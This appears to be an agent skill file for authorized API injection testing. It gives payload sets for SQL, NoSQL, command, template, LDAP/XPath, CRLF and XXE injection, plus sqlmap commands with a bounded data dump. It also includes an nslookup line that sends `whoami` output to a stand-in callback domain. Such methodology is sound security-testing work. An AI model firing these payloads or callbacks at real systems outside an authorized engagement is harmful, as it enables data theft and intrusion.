---
name: api-injection
description: Injection testing against API parameters — SQL, NoSQL, OS command, SSTI, LDAP/XPath, and XML/XXE — delivered through JSON bodies, query/path params, and headers. Use in phase 5 of the api-testing flow, after endpoint/parameter discovery (ffuf/arjun/OpenAPI), to probe each operation, confirm with sqlmap/tplmap/manual payloads, and record exploited endpoints and findings.
license: Apache-2.0
metadata:
  author: Section9Labs
  version: "1.0.0"
---

# API Injection Testing

Phase 5 of the `api-testing` flow. Input: a set of API operations with known
parameters (from the OpenAPI split, ffuf content discovery, or arjun parameter
mining). Output: injectable parameters confirmed per class, recorded as
findings pinned to `api:endpoint` assets.

Classes covered: **SQLi**, **NoSQLi**, **OS command injection**, **SSTI**,
**LDAP/XPath**, **header/CRLF**, and **XML/XXE via content-type confusion**.

## Delivery discipline (applies to every class)

- **Respect the content type.** A JSON API wants payloads *inside* JSON string
  or numeric values — properly escaped (`"q": "' OR '1'='1"` is
  `{"q": "' OR '1'='1"}` on the wire, with the inner quotes JSON-escaped by
  your tooling). Query/path params want URL-encoding. Headers want raw bytes.
- **One variable per test.** Change exactly one parameter per request; keep
  every other field at its known-good baseline value. Record baseline status,
  length, and timing first.
- **JSON gives you structure, not just strings.** You can replace a *value*
  (`"user": "admin'--"`) or replace the *type* (`"user": {"$ne": null}`,
  `"id": [1]`, `"price": true`). Type substitution is the API-native injection
  vector — always try it.
- **Blind ≠ invisible.** Use time delays (`SLEEP(5)`, `pg_sleep(5)`,
  `;sleep 5`) and OOB callbacks (`interactsh-client`, Burp Collaborator DNS)
  for blind confirmation.
- **Prove impact minimally.** A 5-second delay, a reflected `49` from
  `{{7*7}}`, one row of data, one DNS hit, one `/etc/passwd` line. Never
  `DROP`, never `rm`, never mass-extract. `--dump` only what the engagement
  needs.
- **Proxy everything** (`--proxy http://127.0.0.1:8080`) so every confirming
  request/response pair is captured for the finding's `http_exchange`
  evidence.

## Workflow

### 1. Intake and asset marking

Take candidate operations from the discovery fan-out (ffuf/arjun output, or an
OpenAPI document split per resource via the imported **`work-units`** skill:
`split.py openapi`). Normalize each operation to a JSON file:

```json
{"method": "POST",
 "url": "https://api.example.com/v1/orders",
 "headers": {"Authorization": "Bearer eyJ...", "Content-Type": "application/json"},
 "body": {"customer_id": 1, "note": "test", "coupon": "SPRING"},
 "params": ["customer_id", "note", "coupon"]}
```

Mark the service and each operation with `assets.mark` (`api:service` and
`api:endpoint` at `depth: "mapped"`) — wiring in `references/rupu.md` via the
imported **`coverage-assets`** skill.

### 2. Automated probe pass

Run the built-in prober against every operation. It takes a raw HTTP request
template with a `*` injection marker, establishes a baseline, fires per-class
probes (sqli/nosqli/cmd/ssti), and flags anomalies — error signatures, time
deltas, boolean length splits, reflected math:

```
python3 scripts/inject_probe.py request.txt \
    --classes sqli,nosqli,cmd,ssti --sleep 5 \
    --proxy http://127.0.0.1:8080 \
    --out reports/api-injection-units.json
```

`request.txt` is a saved raw request (Burp "copy to file", or built by
`sqlmap_req.py` below) with `*` where the payload goes:

```
POST /v1/orders/search HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer eyJ...

{"q": "*", "limit": 10}
```

The output is a work-unit array (`[{"id","title","targets","hints"}, ...]`)
written atomically under `reports/` — a rupu workflow fans out on it with
`for_each`, or a lead agent dispatches one unit per child
(`references/rupu.md`). Raise each probed endpoint to `depth: "tested"`.

### 3. Confirm per class

Each unit's `hints` name the class and the confirmation tool. Confirmation
procedures below; full flag depth in `references/`.

#### SQLi (`references/sqli.md`)

Manual probes per context:

| Context | Probes |
|---|---|
| JSON string field | `'` → error; `' OR '1'='1` vs `' AND '1'='2` → boolean split; `' AND SLEEP(5)-- -`, `'||pg_sleep(5)--` → time |
| JSON numeric field / path id | `1 AND 1=1` vs `1 AND 1=2`; `1 AND SLEEP(5)`; `1)) OR 1=1-- -` (parenthesis escape) |
| UNION | `' UNION SELECT NULL-- -`, add `NULL`s until column count matches |

Then drive **sqlmap** with the saved request:

```
python3 scripts/sqlmap_req.py op.json --param q --out request.txt
sqlmap -r request.txt --batch --level 2 --risk 2 --random-agent \
       --proxy http://127.0.0.1:8080
```

sqlmap honors the `*` marker anywhere — JSON body values, path segments,
headers — and natively parses JSON bodies (answer `Y` to "process it?"). Key
flags: `-p` to pin a param, `--data` for inline bodies, `--dbms`/`--technique`
to focus, `--batch` for unattended runs. On a hit, escalate minimally:
`--current-user --current-db --banner`, then `--tables -D <db>` and a bounded
`--dump -T users -C username --stop 1` as proof. Reading sqlmap's output
(injection points, techniques, payloads) is covered in the reference.

#### NoSQLi (`references/nosqli.md`)

Operator injection by **type substitution** in JSON:

```json
{"username": "admin", "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^adm"}, "password": {"$ne": null}}
```

URL-encoded operator form for query/form params: `user[$ne]=x&pass[$ne]=x`.
Blind boolean via `$regex` character-by-character; blind time via
`{"$where": "sleep(5000) || true"}`. `nosqlmap` automates Mongo
auth-bypass/extraction. Auth bypass that logs you in as another user is a
confirmed finding (CWE-943).

#### OS command injection (`references/command-ssti.md`)

Target params that plausibly reach a shell: hostnames/IPs (ping, traceroute,
nslookup features), filenames (convert, zip, report generators), URLs (wget
fetchers). Separators: `;`, `|`, `&&`, `||`, `$( )`, backticks, `%0a`
(newline), `%0a` inside JSON as `\n`. Confirm blind via time
(`;sleep 5`, `& ping -n 6 127.0.0.1` on Windows) and OOB:

```
interactsh-client -v          # note your payload domain
payload: ;nslookup $(whoami).xxxxxxxx.oast.example.net
```

A DNS hit carrying command output is full confirmation (CWE-78).

#### SSTI (`references/command-ssti.md`)

Seed every reflected string field with the polyglot set:
`{{7*7}}`, `${7*7}`, `#{7*7}`, `<%=7*7%>`, `{{7*'7'}}`. A `49` (or `7777777`
for Jinja2's string-multiply) in the response confirms evaluation; the *which*
identifies the engine. Escalate per engine (Jinja2 `__subclasses__` →
`popen`, Twig/Freemarker/Velocity chains in the reference) to one `id` output
or one file line. `tplmap -u` automates detection and shells.

#### LDAP / XPath / headers / XXE (`references/ldap-xxe.md`)

- LDAP filter injection: `*)(uid=*))(|(uid=*`, `admin)(&)` — auth bypass and
  wildcard enumeration.
- XPath: `' or '1'='1`, position-based blind extraction.
- CRLF/header injection: `%0d%0aSet-Cookie:...` in header-reflected params;
  Host-header poisoning on cache/password-reset flows.
- **Content-type confusion → XXE**: re-send a JSON request as
  `Content-Type: application/xml` with the same fields as XML. If the parser
  accepts it, test external entities (file read, SSRF via `http://` entity,
  blind/OOB via parameter entities to interactsh), and detect — do not
  detonate — billion-laughs amplification.

### 4. Record results

Every confirmed injection (time delay, extracted row, reflected eval, OOB
callback, auth bypass) → `findings.report` under the `api` profile, pinned to
the endpoint's `http_route` coordinate, with the exact `http_exchange`
request/response pair, CWE from {89 SQLi, 943 NoSQLi, 78 command, 1336 SSTI,
90 LDAP, 643 XPath, 611 XXE, 113 CRLF}. Field contract: imported
**`finding-report`** skill. Raise the endpoint asset to `depth: "exploited"`.
Tested-but-clean endpoints stay at `tested` — that negative coverage is the
point of `assets.mark`.

## Scripts

| Script | Purpose |
|---|---|
| `scripts/inject_probe.py` | Baseline + per-class probe pass over a raw request template with `*` markers; flags anomalies; emits `reports/api-injection-units.json` work units for sqlmap/tplmap follow-up. |
| `scripts/sqlmap_req.py` | Builds a `sqlmap -r`-ready raw request file (with `*` markers) from a normalized operation JSON; marks named params in query, JSON body, or path segment. |

Both are Python 3 stdlib only. Run `-h` for full options.

## References

- `references/sqli.md` — manual SQLi over JSON/REST, sqlmap flags and output reading.
- `references/nosqli.md` — Mongo operator/`$where` injection, blind extraction, nosqlmap.
- `references/command-ssti.md` — command separators, OOB confirmation, SSTI engine fingerprinting and per-engine escalation, tplmap.
- `references/ldap-xxe.md` — LDAP/XPath filters, CRLF/Host header, content-type confusion and XXE (file read, SSRF, blind OOB).
- `references/rupu.md` — work-unit fan-out, `assets.mark` depth ladder, `findings.report` hand-off.
